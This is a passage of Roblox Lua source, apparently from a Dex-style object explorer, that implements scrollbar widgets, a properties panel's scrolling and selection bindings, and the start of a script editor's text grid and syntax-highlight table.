			Transparency = 1;
			AutoButtonColor = false;
			Active = true;
			ZIndex = 10;
		})

		local Class = setmetatable({
			GUI = ScrollFrame;
			ScrollIndex = 0;
			VisibleSpace = 0;
			TotalSpace = 0;
			PageIncrement = 1;
		},mt)

		local UpdateScrollThumb
		if horizontal then
			function UpdateScrollThumb()
				ScrollThumbFrame.Size = UDim2.new(Class.VisibleSpace/Class.TotalSpace,0,0,ScrollBarWidth)
				if ScrollThumbFrame.AbsoluteSize.x < ScrollBarWidth then
					ScrollThumbFrame.Size = UDim2.new(0,ScrollBarWidth,0,ScrollBarWidth)
				end
				local barSize = ScrollBarFrame.AbsoluteSize.x
				ScrollThumbFrame.Position = UDim2.new(Class:GetScrollPercent()*(barSize - ScrollThumbFrame.AbsoluteSize.x)/barSize,0,0,0)
			end
		else
			function UpdateScrollThumb()
				ScrollThumbFrame.Size = UDim2.new(0,ScrollBarWidth,Class.VisibleSpace/Class.TotalSpace,0)
				if ScrollThumbFrame.AbsoluteSize.y < ScrollBarWidth then
					ScrollThumbFrame.Size = UDim2.new(0,ScrollBarWidth,0,ScrollBarWidth)
				end
				local barSize = ScrollBarFrame.AbsoluteSize.y
				ScrollThumbFrame.Position = UDim2.new(0,0,Class:GetScrollPercent()*(barSize - ScrollThumbFrame.AbsoluteSize.y)/barSize,0)
			end
		end

		local lastDown
		local lastUp
		local scrollStyle = {BackgroundColor3=ScrollStyles.Border,BackgroundTransparency=0}
		local scrollStyle_ds = {BackgroundColor3=ScrollStyles.Border,BackgroundTransparency=0.7}

		local function Update()
			local t = Class.TotalSpace
			local v = Class.VisibleSpace
			local s = Class.ScrollIndex
			if v <= t then
				if s > 0 then
					if s + v > t then
						Class.ScrollIndex = t - v
					end
				else
					Class.ScrollIndex = 0
				end
			else
				Class.ScrollIndex = 0
			end

			if Class.UpdateCallback then
				if Class.UpdateCallback(Class) == false then
					return
				end
			end

			local down = Class:CanScrollDown()
			local up = Class:CanScrollUp()
			if down ~= lastDown then
				lastDown = down
				ScrollDownFrame.Active = down
				ScrollDownFrame.AutoButtonColor = down
				local children = ScrollDownGraphic:GetChildren()
				local style = down and scrollStyle or scrollStyle_ds
				for i = 1,#children do
					Create(children[i],style)
				end
			end
			if up ~= lastUp then
				lastUp = up
				ScrollUpFrame.Active = up
				ScrollUpFrame.AutoButtonColor = up
				local children = ScrollUpGraphic:GetChildren()
				local style = up and scrollStyle or scrollStyle_ds
				for i = 1,#children do
					Create(children[i],style)
				end
			end
			ScrollThumbFrame.Visible = down or up
			UpdateScrollThumb()
		end
		Class.Update = Update

		SetZIndexOnChanged(ScrollFrame)

		local scrollEventID = 0
		ScrollDownFrame.MouseButton1Down:connect(function()
			scrollEventID = tick()
			local current = scrollEventID
			local up_con
			up_con = MouseDrag.MouseButton1Up:connect(function()
				scrollEventID = tick()
				MouseDrag.Parent = nil
				ResetButtonColor(ScrollDownFrame)
				up_con:disconnect(); drag = nil
			end)
			MouseDrag.Parent = GetScreen(ScrollFrame)
			Class:ScrollDown()
			wait(0.2) -- delay before auto scroll
			while scrollEventID == current do
				Class:ScrollDown()
				if not Class:CanScrollDown() then break end
				wait()
			end
		end)

		ScrollDownFrame.MouseButton1Up:connect(function()
			scrollEventID = tick()
		end)

		ScrollUpFrame.MouseButton1Down:connect(function()
			scrollEventID = tick()
			local current = scrollEventID
			local up_con
			up_con = MouseDrag.MouseButton1Up:connect(function()
				scrollEventID = tick()
				MouseDrag.Parent = nil
				ResetButtonColor(ScrollUpFrame)
				up_con:disconnect(); drag = nil
			end)
			MouseDrag.Parent = GetScreen(ScrollFrame)
			Class:ScrollUp()
			wait(0.2)
			while scrollEventID == current do
				Class:ScrollUp()
				if not Class:CanScrollUp() then break end
				wait()
			end
		end)

		ScrollUpFrame.MouseButton1Up:connect(function()
			scrollEventID = tick()
		end)

		if horizontal then
			ScrollBarFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local current = scrollEventID
				local up_con
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollUpFrame)
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
				if x > ScrollThumbFrame.AbsolutePosition.x then
					Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if x < ScrollThumbFrame.AbsolutePosition.x + ScrollThumbFrame.AbsoluteSize.x then break end
						Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
						wait()
					end
				else
					Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if x > ScrollThumbFrame.AbsolutePosition.x then break end
						Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
						wait()
					end
				end
			end)
		else
			ScrollBarFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local current = scrollEventID
				local up_con
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollUpFrame)
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
				if y > ScrollThumbFrame.AbsolutePosition.y then
					Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if y < ScrollThumbFrame.AbsolutePosition.y + ScrollThumbFrame.AbsoluteSize.y then break end
						Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
						wait()
					end
				else
					Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if y > ScrollThumbFrame.AbsolutePosition.y then break end
						Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
						wait()
					end
				end
			end)
		end

		if horizontal then
			ScrollThumbFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local mouse_offset = x - ScrollThumbFrame.AbsolutePosition.x
				local drag_con
				local up_con
				drag_con = MouseDrag.MouseMoved:connect(function(x,y)
					local bar_abs_pos = ScrollBarFrame.AbsolutePosition.x
					local bar_drag = ScrollBarFrame.AbsoluteSize.x - ScrollThumbFrame.AbsoluteSize.x
					local bar_abs_one = bar_abs_pos + bar_drag
					x = x - mouse_offset
					x = x < bar_abs_pos and bar_abs_pos or x > bar_abs_one and bar_abs_one or x
					x = x - bar_abs_pos
					Class:SetScrollPercent(x/(bar_drag))
				end)
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollThumbFrame)
					drag_con:disconnect(); drag_con = nil
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
			end)
		else
			ScrollThumbFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local mouse_offset = y - ScrollThumbFrame.AbsolutePosition.y
				local drag_con
				local up_con
				drag_con = MouseDrag.MouseMoved:connect(function(x,y)
					local bar_abs_pos = ScrollBarFrame.AbsolutePosition.y
					local bar_drag = ScrollBarFrame.AbsoluteSize.y - ScrollThumbFrame.AbsoluteSize.y
					local bar_abs_one = bar_abs_pos + bar_drag
					y = y - mouse_offset
					y = y < bar_abs_pos and bar_abs_pos or y > bar_abs_one and bar_abs_one or y
					y = y - bar_abs_pos
					Class:SetScrollPercent(y/(bar_drag))
				end)
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollThumbFrame)
					drag_con:disconnect(); drag_con = nil
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
			end)
		end

		function Class:Destroy()
			ScrollFrame:Destroy()
			MouseDrag:Destroy()
			for k in pairs(Class) do
				Class[k] = nil
			end
			setmetatable(Class,nil)
		end

		Update()

		return Class
	end
end

----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(1, -1 * ScrollBarWidth, 1, 0)
MainFrame.Position = UDim2.new(0, 0, 0, 0)
MainFrame.BackgroundTransparency = 1
MainFrame.ClipsDescendants = true
MainFrame.Parent = PropertiesFrame

ContentFrame = Instance.new("Frame")
ContentFrame.Name = "ContentFrame"
ContentFrame.Size = UDim2.new(1, 0, 0, 0)
ContentFrame.BackgroundTransparency = 1
ContentFrame.Parent = MainFrame

scrollBar = ScrollBar(false)
scrollBar.PageIncrement = 1
Create(scrollBar.GUI,{
	Position = UDim2.new(1,-ScrollBarWidth,0,0);
	Size = UDim2.new(0,ScrollBarWidth,1,0);
	Parent = PropertiesFrame;
})

scrollBarH = ScrollBar(true)
scrollBarH.PageIncrement = ScrollBarWidth
Create(scrollBarH.GUI,{
	Position = UDim2.new(0,0,1,-ScrollBarWidth);
	Size = UDim2.new(1,-ScrollBarWidth,0,ScrollBarWidth);
	Visible = false;
	Parent = PropertiesFrame;
})

do
	local listEntries = {}
	local nameConnLookup = {}
	
	function scrollBar.UpdateCallback(self)
		scrollBar.TotalSpace = ContentFrame.AbsoluteSize.Y
		scrollBar.VisibleSpace = MainFrame.AbsoluteSize.Y
		ContentFrame.Position = UDim2.new(ContentFrame.Position.X.Scale,ContentFrame.Position.X.Offset,0,-1*scrollBar.ScrollIndex)
	end

	function scrollBarH.UpdateCallback(self)
		
	end

	MainFrame.Changed:connect(function(p)
		if p == 'AbsoluteSize' then
			scrollBarH.VisibleSpace = math.ceil(MainFrame.AbsoluteSize.x)
			scrollBarH:Update()
			scrollBar.VisibleSpace = math.ceil(MainFrame.AbsoluteSize.y)
			scrollBar:Update()
		end
	end)

	local wheelAmount = Row.Height
	PropertiesFrame.MouseWheelForward:connect(function()
		if scrollBar.VisibleSpace - 1 > wheelAmount then
			scrollBar:ScrollTo(scrollBar.ScrollIndex - wheelAmount)
		else
			scrollBar:ScrollTo(scrollBar.ScrollIndex - scrollBar.VisibleSpace)
		end
	end)
	PropertiesFrame.MouseWheelBackward:connect(function()
		if scrollBar.VisibleSpace - 1 > wheelAmount then
			scrollBar:ScrollTo(scrollBar.ScrollIndex + wheelAmount)
		else
			scrollBar:ScrollTo(scrollBar.ScrollIndex + scrollBar.VisibleSpace)
		end
	end)
end

scrollBar.VisibleSpace = math.ceil(MainFrame.AbsoluteSize.y)
scrollBar:Update()

showProperties(GetSelection())

bindSelectionChanged.Event:connect(function()
	showProperties(GetSelection())
end)

bindSetAwait.Event:connect(function(obj)
	if AwaitingObjectValue then
		AwaitingObjectValue = false
		local mySel = obj
		if mySel then
			pcall(function()
				Set(AwaitingObjectObj, AwaitingObjectProp, mySel)
			end)
		end
	end
end)

propertiesSearch.Changed:connect(function(prop)
	if prop == "Text" then
		showProperties(GetSelection())
	end
end)

bindGetApi.OnInvoke = function()
	return RbxApi
end

bindGetAwait.OnInvoke = function()
	return AwaitingObjectValue
end
end)
spawn(function()
	local top = D_E_X.ScriptEditor

local editorGrid = top:WaitForChild("EditorGrid")

local currentSource = ""

local currentEditor = {
	x = 0,
	y = 0
}

local userInput = game:GetService("UserInputService")
local mouse = game.Players.LocalPlayer:GetMouse()

local topBar = top:WaitForChild("TopBar")
local scriptBar = topBar:WaitForChild("ScriptBar")
local scriptBarLeft = topBar:WaitForChild("ScriptBarLeft")
local scriptBarRight = topBar:WaitForChild("ScriptBarRight")
local clipboardButton = topBar:WaitForChild("Clipboard")

local entryTemplate = topBar:WaitForChild("Entry")

local openEvent = top:WaitForChild("OpenScript")

local closeButton = top:WaitForChild("Close")

local memoryScripts = {}

local editingIndex = 0

-- Scrollbar

local ScrollBarWidth = 16

local ScrollStyles = {
	Background      = Color3.new(233/255, 233/255, 233/255);
	Border          = Color3.new(149/255, 149/255, 149/255);
	Selected        = Color3.new( 63/255, 119/255, 189/255);
	BorderSelected  = Color3.new( 55/255, 106/255, 167/255);
	Text            = Color3.new(  0/255,   0/255,   0/255);
	TextDisabled    = Color3.new(128/255, 128/255, 128/255);
	TextSelected    = Color3.new(255/255, 255/255, 255/255);
	Button          = Color3.new(221/255, 221/255, 221/255);
	ButtonBorder    = Color3.new(149/255, 149/255, 149/255);
	ButtonSelected  = Color3.new(255/255,   0/255,   0/255);
	Field           = Color3.new(255/255, 255/255, 255/255);
	FieldBorder     = Color3.new(191/255, 191/255, 191/255);
	TitleBackground = Color3.new(178/255, 178/255, 178/255);
}
do
	local ZIndexLock = {}
	function SetZIndex(object,z)
		if not ZIndexLock[object] then
			ZIndexLock[object] = true
			if object:IsA'GuiObject' then
				object.ZIndex = z
			end
			local children = object:GetChildren()
			for i = 1,#children do
				SetZIndex(children[i],z)
			end
			ZIndexLock[object] = nil
		end
	end
end
function SetZIndexOnChanged(object)
	return object.Changed:connect(function(p)
		if p == "ZIndex" then
			SetZIndex(object,object.ZIndex)
		end
	end)
end
function Create(ty,data)
	local obj
	if type(ty) == 'string' then
		obj = Instance.new(ty)
	else
		obj = ty
	end
	for k, v in pairs(data) do
		if type(k) == 'number' then
			v.Parent = obj
		else
			obj[k] = v
		end
	end
	return obj
end
-- returns the ascendant ScreenGui of an object
function GetScreen(screen)
	if screen == nil then return nil end
	while not screen:IsA("ScreenGui") do
		screen = screen.Parent
		if screen == nil then return nil end
	end
	return screen
end
-- AutoButtonColor doesn't always reset properly
function ResetButtonColor(button)
	local active = button.Active
	button.Active = not active
	button.Active = active
end

function ArrowGraphic(size,dir,scaled,template)
	local Frame = Create('Frame',{
		Name = "Arrow Graphic";
		BorderSizePixel = 0;
		Size = UDim2.new(0,size,0,size);
		Transparency = 1;
	})
	if not template then
		template = Instance.new("Frame")
		template.BorderSizePixel = 0
	end

	local transform
	if dir == nil or dir == 'Up' then
		function transform(p,s) return p,s end
	elseif dir == 'Down' then
		function transform(p,s) return UDim2.new(0,p.X.Offset,0,size-p.Y.Offset-1),s end
	elseif dir == 'Left' then
		function transform(p,s) return UDim2.new(0,p.Y.Offset,0,p.X.Offset),UDim2.new(0,s.Y.Offset,0,s.X.Offset) end
	elseif dir == 'Right' then
		function transform(p,s) return UDim2.new(0,size-p.Y.Offset-1,0,p.X.Offset),UDim2.new(0,s.Y.Offset,0,s.X.Offset) end
	end

	local scale
	if scaled then
		function scale(p,s) return UDim2.new(p.X.Offset/size,0,p.Y.Offset/size,0),UDim2.new(s.X.Offset/size,0,s.Y.Offset/size,0) end
	else
		function scale(p,s) return p,s end
	end

	local o = math.floor(size/4)
	if size%2 == 0 then
		local n = size/2-1
		for i = 0,n do
			local t = template:Clone()
			local p,s = scale(transform(
				UDim2.new(0,n-i,0,o+i),
				UDim2.new(0,(i+1)*2,0,1)
			))
			t.Position = p
			t.Size = s
			t.Parent = Frame
		end
	else
		local n = (size-1)/2
		for i = 0,n do
			local t = template:Clone()
			local p,s = scale(transform(
				UDim2.new(0,n-i,0,o+i),
				UDim2.new(0,i*2+1,0,1)
			))
			t.Position = p
			t.Size = s
			t.Parent = Frame
		end
	end
	if size%4 > 1 then
		local t = template:Clone()
		local p,s = scale(transform(
			UDim2.new(0,0,0,size-o-1),
			UDim2.new(0,size,0,1)
		))
		t.Position = p
		t.Size = s
		t.Parent = Frame
	end
	return Frame
end

function GripGraphic(size,dir,spacing,scaled,template)
	local Frame = Create('Frame',{
		Name = "Grip Graphic";
		BorderSizePixel = 0;
		Size = UDim2.new(0,size.x,0,size.y);
		Transparency = 1;
	})
	if not template then
		template = Instance.new("Frame")
		template.BorderSizePixel = 0
	end

	spacing = spacing or 2

	local scale
	if scaled then
		function scale(p) return UDim2.new(p.X.Offset/size.x,0,p.Y.Offset/size.y,0) end
	else
		function scale(p) return p end
	end

	if dir == 'Vertical' then
		for i=0,size.x-1,spacing do
			local t = template:Clone()
			t.Size = scale(UDim2.new(0,1,0,size.y))
			t.Position = scale(UDim2.new(0,i,0,0))
			t.Parent = Frame
		end
	elseif dir == nil or dir == 'Horizontal' then
		for i=0,size.y-1,spacing do
			local t = template:Clone()
			t.Size = scale(UDim2.new(0,size.x,0,1))
			t.Position = scale(UDim2.new(0,0,0,i))
			t.Parent = Frame
		end
	end

	return Frame
end

do
	local mt = {
		__index = {
			GetScrollPercent = function(self)
				return self.ScrollIndex/(self.TotalSpace-self.VisibleSpace)
			end;
			CanScrollDown = function(self)
				return self.ScrollIndex + self.VisibleSpace < self.TotalSpace
			end;
			CanScrollUp = function(self)
				return self.ScrollIndex > 0
			end;
			ScrollDown = function(self)
				self.ScrollIndex = self.ScrollIndex + self.PageIncrement
				self:Update()
			end;
			ScrollUp = function(self)
				self.ScrollIndex = self.ScrollIndex - self.PageIncrement
				self:Update()
			end;
			ScrollTo = function(self,index)
				self.ScrollIndex = index
				self:Update()
			end;
			SetScrollPercent = function(self,percent)
				self.ScrollIndex = math.floor((self.TotalSpace - self.VisibleSpace)*percent + 0.5)
				self:Update()
			end;
		};
	}
	mt.__index.CanScrollRight = mt.__index.CanScrollDown
	mt.__index.CanScrollLeft = mt.__index.CanScrollUp
	mt.__index.ScrollLeft = mt.__index.ScrollUp
	mt.__index.ScrollRight = mt.__index.ScrollDown

	function ScrollBar(horizontal)
		-- create row scroll bar
		local ScrollFrame = Create('Frame',{
			Name = "ScrollFrame";
			Position = horizontal and UDim2.new(0,0,1,-ScrollBarWidth) or UDim2.new(1,-ScrollBarWidth,0,0);
			Size = horizontal and UDim2.new(1,0,0,ScrollBarWidth) or UDim2.new(0,ScrollBarWidth,1,0);
			BackgroundTransparency = 1;
			Create('ImageButton',{
				Name = "ScrollDown";
				Position = horizontal and UDim2.new(1,-ScrollBarWidth,0,0) or UDim2.new(0,0,1,-ScrollBarWidth);
				Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
				BackgroundColor3 = ScrollStyles.Button;
				BorderColor3 = ScrollStyles.Border;
				--BorderSizePixel = 0;
			});
			Create('ImageButton',{
				Name = "ScrollUp";
				Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
				BackgroundColor3 = ScrollStyles.Button;
				BorderColor3 = ScrollStyles.Border;
				--BorderSizePixel = 0;
			});
			Create('ImageButton',{
				Name = "ScrollBar";
				Size = horizontal and UDim2.new(1,-ScrollBarWidth*2,1,0) or UDim2.new(1,0,1,-ScrollBarWidth*2);
				Position = horizontal and UDim2.new(0,ScrollBarWidth,0,0) or UDim2.new(0,0,0,ScrollBarWidth);
				AutoButtonColor = false;
				BackgroundColor3 = Color3.new(0.94902, 0.94902, 0.94902);
				BorderColor3 = ScrollStyles.Border;
				--BorderSizePixel = 0;
				Create('ImageButton',{
					Name = "ScrollThumb";
					AutoButtonColor = false;
					Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
					BackgroundColor3 = ScrollStyles.Button;
					BorderColor3 = ScrollStyles.Border;
					--BorderSizePixel = 0;
				});
			});
		})

		local graphicTemplate = Create('Frame',{
			Name="Graphic";
			BorderSizePixel = 0;
			BackgroundColor3 = ScrollStyles.Border;
		})
		local graphicSize = ScrollBarWidth/2

		local ScrollDownFrame = ScrollFrame.ScrollDown
			local ScrollDownGraphic = ArrowGraphic(graphicSize,horizontal and 'Right' or 'Down',true,graphicTemplate)
			ScrollDownGraphic.Position = UDim2.new(0.5,-graphicSize/2,0.5,-graphicSize/2)
			ScrollDownGraphic.Parent = ScrollDownFrame
		local ScrollUpFrame = ScrollFrame.ScrollUp
			local ScrollUpGraphic = ArrowGraphic(graphicSize,horizontal and 'Left' or 'Up',true,graphicTemplate)
			ScrollUpGraphic.Position = UDim2.new(0.5,-graphicSize/2,0.5,-graphicSize/2)
			ScrollUpGraphic.Parent = ScrollUpFrame
		local ScrollBarFrame = ScrollFrame.ScrollBar
		local ScrollThumbFrame = ScrollBarFrame.ScrollThumb
		do
			local size = ScrollBarWidth*3/8
			local Decal = GripGraphic(Vector2.new(size,size),horizontal and 'Vertical' or 'Horizontal',2,graphicTemplate)
			Decal.Position = UDim2.new(0.5,-size/2,0.5,-size/2)
			Decal.Parent = ScrollThumbFrame
		end

		local MouseDrag = Create('ImageButton',{
			Name = "MouseDrag";
			Position = UDim2.new(-0.25,0,-0.25,0);
			Size = UDim2.new(1.5,0,1.5,0);
			Transparency = 1;
			AutoButtonColor = false;
			Active = true;
			ZIndex = 10;
		})

		local Class = setmetatable({
			GUI = ScrollFrame;
			ScrollIndex = 0;
			VisibleSpace = 0;
			TotalSpace = 0;
			PageIncrement = 1;
		},mt)

		local UpdateScrollThumb
		if horizontal then
			function UpdateScrollThumb()
				ScrollThumbFrame.Size = UDim2.new(Class.VisibleSpace/Class.TotalSpace,0,0,ScrollBarWidth)
				if ScrollThumbFrame.AbsoluteSize.x < ScrollBarWidth then
					ScrollThumbFrame.Size = UDim2.new(0,ScrollBarWidth,0,ScrollBarWidth)
				end
				local barSize = ScrollBarFrame.AbsoluteSize.x
				ScrollThumbFrame.Position = UDim2.new(Class:GetScrollPercent()*(barSize - ScrollThumbFrame.AbsoluteSize.x)/barSize,0,0,0)
			end
		else
			function UpdateScrollThumb()
				ScrollThumbFrame.Size = UDim2.new(0,ScrollBarWidth,Class.VisibleSpace/Class.TotalSpace,0)
				if ScrollThumbFrame.AbsoluteSize.y < ScrollBarWidth then
					ScrollThumbFrame.Size = UDim2.new(0,ScrollBarWidth,0,ScrollBarWidth)
				end
				local barSize = ScrollBarFrame.AbsoluteSize.y
				ScrollThumbFrame.Position = UDim2.new(0,0,Class:GetScrollPercent()*(barSize - ScrollThumbFrame.AbsoluteSize.y)/barSize,0)
			end
		end

		local lastDown
		local lastUp
		local scrollStyle = {BackgroundColor3=ScrollStyles.Border,BackgroundTransparency=0}
		local scrollStyle_ds = {BackgroundColor3=ScrollStyles.Border,BackgroundTransparency=0.7}

		local function Update()
			local t = Class.TotalSpace
			local v = Class.VisibleSpace
			local s = Class.ScrollIndex
			if v <= t then
				if s > 0 then
					if s + v > t then
						Class.ScrollIndex = t - v
					end
				else
					Class.ScrollIndex = 0
				end
			else
				Class.ScrollIndex = 0
			end

			if Class.UpdateCallback then
				if Class.UpdateCallback(Class) == false then
					return
				end
			end

			local down = Class:CanScrollDown()
			local up = Class:CanScrollUp()
			if down ~= lastDown then
				lastDown = down
				ScrollDownFrame.Active = down
				ScrollDownFrame.AutoButtonColor = down
				local children = ScrollDownGraphic:GetChildren()
				local style = down and scrollStyle or scrollStyle_ds
				for i = 1,#children do
					Create(children[i],style)
				end
			end
			if up ~= lastUp then
				lastUp = up
				ScrollUpFrame.Active = up
				ScrollUpFrame.AutoButtonColor = up
				local children = ScrollUpGraphic:GetChildren()
				local style = up and scrollStyle or scrollStyle_ds
				for i = 1,#children do
					Create(children[i],style)
				end
			end
			ScrollThumbFrame.Visible = down or up
			UpdateScrollThumb()
		end
		Class.Update = Update

		SetZIndexOnChanged(ScrollFrame)

		local scrollEventID = 0
		ScrollDownFrame.MouseButton1Down:connect(function()
			scrollEventID = tick()
			local current = scrollEventID
			local up_con
			up_con = MouseDrag.MouseButton1Up:connect(function()
				scrollEventID = tick()
				MouseDrag.Parent = nil
				ResetButtonColor(ScrollDownFrame)
				up_con:disconnect(); drag = nil
			end)
			MouseDrag.Parent = GetScreen(ScrollFrame)
			Class:ScrollDown()
			wait(0.2) -- delay before auto scroll
			while scrollEventID == current do
				Class:ScrollDown()
				if not Class:CanScrollDown() then break end
				wait()
			end
		end)

		ScrollDownFrame.MouseButton1Up:connect(function()
			scrollEventID = tick()
		end)

		ScrollUpFrame.MouseButton1Down:connect(function()
			scrollEventID = tick()
			local current = scrollEventID
			local up_con
			up_con = MouseDrag.MouseButton1Up:connect(function()
				scrollEventID = tick()
				MouseDrag.Parent = nil
				ResetButtonColor(ScrollUpFrame)
				up_con:disconnect(); drag = nil
			end)
			MouseDrag.Parent = GetScreen(ScrollFrame)
			Class:ScrollUp()
			wait(0.2)
			while scrollEventID == current do
				Class:ScrollUp()
				if not Class:CanScrollUp() then break end
				wait()
			end
		end)

		ScrollUpFrame.MouseButton1Up:connect(function()
			scrollEventID = tick()
		end)

		if horizontal then
			ScrollBarFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local current = scrollEventID
				local up_con
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollUpFrame)
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
				if x > ScrollThumbFrame.AbsolutePosition.x then
					Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if x < ScrollThumbFrame.AbsolutePosition.x + ScrollThumbFrame.AbsoluteSize.x then break end
						Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
						wait()
					end
				else
					Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if x > ScrollThumbFrame.AbsolutePosition.x then break end
						Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
						wait()
					end
				end
			end)
		else
			ScrollBarFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local current = scrollEventID
				local up_con
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollUpFrame)
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
				if y > ScrollThumbFrame.AbsolutePosition.y then
					Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if y < ScrollThumbFrame.AbsolutePosition.y + ScrollThumbFrame.AbsoluteSize.y then break end
						Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
						wait()
					end
				else
					Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if y > ScrollThumbFrame.AbsolutePosition.y then break end
						Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
						wait()
					end
				end
			end)
		end

		if horizontal then
			ScrollThumbFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local mouse_offset = x - ScrollThumbFrame.AbsolutePosition.x
				local drag_con
				local up_con
				drag_con = MouseDrag.MouseMoved:connect(function(x,y)
					local bar_abs_pos = ScrollBarFrame.AbsolutePosition.x
					local bar_drag = ScrollBarFrame.AbsoluteSize.x - ScrollThumbFrame.AbsoluteSize.x
					local bar_abs_one = bar_abs_pos + bar_drag
					x = x - mouse_offset
					x = x < bar_abs_pos and bar_abs_pos or x > bar_abs_one and bar_abs_one or x
					x = x - bar_abs_pos
					Class:SetScrollPercent(x/(bar_drag))
				end)
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollThumbFrame)
					drag_con:disconnect(); drag_con = nil
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
			end)
		else
			ScrollThumbFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local mouse_offset = y - ScrollThumbFrame.AbsolutePosition.y
				local drag_con
				local up_con
				drag_con = MouseDrag.MouseMoved:connect(function(x,y)
					local bar_abs_pos = ScrollBarFrame.AbsolutePosition.y
					local bar_drag = ScrollBarFrame.AbsoluteSize.y - ScrollThumbFrame.AbsoluteSize.y
					local bar_abs_one = bar_abs_pos + bar_drag
					y = y - mouse_offset
					y = y < bar_abs_pos and bar_abs_pos or y > bar_abs_one and bar_abs_one or y
					y = y - bar_abs_pos
					Class:SetScrollPercent(y/(bar_drag))
				end)
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollThumbFrame)
					drag_con:disconnect(); drag_con = nil
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
			end)
		end

		function Class:Destroy()
			ScrollFrame:Destroy()
			MouseDrag:Destroy()
			for k in pairs(Class) do
				Class[k] = nil
			end
			setmetatable(Class,nil)
		end

		Update()

		return Class
	end
end

-- End Scrollbar

local scrollBar = ScrollBar(false)
scrollBar.PageIncrement = 16
Create(scrollBar.GUI,{
	Position = UDim2.new(1,0,0,0);
	Size = UDim2.new(0,ScrollBarWidth,1,0);
	Parent = editorGrid;
})

local scrollBarH = ScrollBar(true)
scrollBarH.PageIncrement = 8
Create(scrollBarH.GUI,{
	Position = UDim2.new(0,0,1,0);
	Size = UDim2.new(1,0,0,ScrollBarWidth);
	Parent = editorGrid;
})

local entries = {}

local grid = {}

local count = 1
local xCount = 1

local lineSpan = 0

for i = 0,490,8 do
	local newRow = {}
	for j = 0,390,16 do
		local cellText = Instance.new("TextLabel",editorGrid)
		cellText.BackgroundTransparency = 1
		cellText.BorderSizePixel = 0
		cellText.Text = ""
		cellText.Position = UDim2.new(0,i,0,j)
		cellText.Size = UDim2.new(0,8,0,16)
		cellText.Font = Enum.Font.SourceSans
		cellText.FontSize = Enum.FontSize.Size18
		table.insert(newRow,cellText)
		xCount = xCount + 1
	end
	table.insert(grid,newRow)
	count = count + 1
	xCount = 1
end

local syntaxHighlightList = {
	{["Keyword"] = "for", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "local", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "if", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "then", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
	{["Keyword"] = "do", ["Color"] = Color3.new(0, 0, 127/255), ["Independent"] = true},
